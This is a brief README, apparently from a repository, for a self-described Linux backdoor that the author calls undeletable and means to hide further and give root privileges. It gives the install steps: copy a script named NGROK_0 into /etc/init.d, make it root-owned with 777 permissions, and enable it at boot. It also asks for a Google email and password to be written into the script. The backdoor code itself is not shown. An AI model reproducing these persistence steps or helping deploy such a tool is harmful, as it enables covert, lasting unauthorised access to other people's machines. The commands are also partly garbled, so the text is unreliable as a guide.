# linux_backdoor<br/>
linux backdoor , have some fanctionalites , its undeletble , i am still working to hide it and gave it root previlages<br/>
after you download it you do this commands:<br/>
nano NGROK_0<br/>
#change MAIL and PASSWD in line 23 , 24 , to your google email and password<br/>
sudo mv NGROK_0 /etc/init.d/<br/>
sudo chown root:root /etc/init.d/NGROK_0<br/>
sudo chmod 777 /etc/init.d/NGROK_0<br/>
sudo update-rc.d  NGROK_0 defaults<br/>
sudo update-rc.d  NGROK_0 enable<br/>
sudo systemctl daemon-reload<br/>
sudo service start  NGROK_0<br/>


